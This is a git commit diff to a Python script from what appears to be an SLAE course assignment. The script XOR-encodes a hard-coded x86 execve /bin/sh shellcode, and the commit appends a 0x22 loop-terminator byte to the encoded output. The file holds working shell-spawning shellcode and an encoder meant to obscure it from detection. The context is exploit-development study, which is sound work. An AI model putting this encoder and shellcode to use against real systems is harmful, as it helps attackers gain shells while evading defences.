0a8809852d11c85788247bffe205a4ccc36491fc
jayeshchm <59499796+jayeshchm@users.noreply.github.com>
2020-08-16 00:41:33 +0530

    Update xor-encode1.py

--- SLAE Assignment 4/xor-encode1.py
+++ SLAE Assignment 4/xor-encode1.py
@@ -17,11 +17,12 @@ def encodeByte(i , cnt):
 		exit(1)
 	return j
 
-shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")	#Put your shellcode
 
 encoded = ""
 encoded2 = ""
 rev_encoded = []
+terminator = 34
 
 cnt = 1
 
@@ -31,15 +32,21 @@ for i in bytearray(shellcode):
 
 	encoded += "\\x"
 	encoded += "%02x" %j
-		
 
 	encoded2 += "0x"
 	encoded2 += "%02x," %j
 	
 	cnt = cnt + 1
 
+
+encoded += "\\x"
+encoded += "%02x" %terminator
+
+encoded2 += "0x"
+encoded2 += "%02x," %terminator
+
+
 print encoded + '\n'
 print encoded2 + '\n'
-print "Add Loop terminator byte 0x22 at the end of encoded shellcode\n"
 
 print 'Shellcode length:%d' %len(shellcode)
